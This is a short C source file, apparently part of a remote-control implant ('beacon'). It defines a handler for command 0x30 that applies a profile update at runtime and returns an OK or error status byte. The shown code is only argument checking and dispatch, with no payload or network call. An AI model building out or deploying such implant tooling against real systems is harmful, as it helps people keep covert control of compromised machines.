/* beacon/src/Commands/Profile.c
 * CMD_PROFILE (0x30) - apply a v2 profile update at runtime. */

#include "Nax.h"

FUNC INT NaxCmdProfile( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 4 ) {
        out[0] = NAX_STATUS_ERR;
        *out_len = 1;
        return NAX_OK;
    }

    INT rc = NaxApplyProfile( Nax, args, args_len );
    if ( rc == NAX_OK ) {
        out[0] = NAX_STATUS_OK;
        *out_len = 1;
    } else {
        out[0] = NAX_STATUS_ERR;
        *out_len = 1;
    }
    return NAX_OK;
}
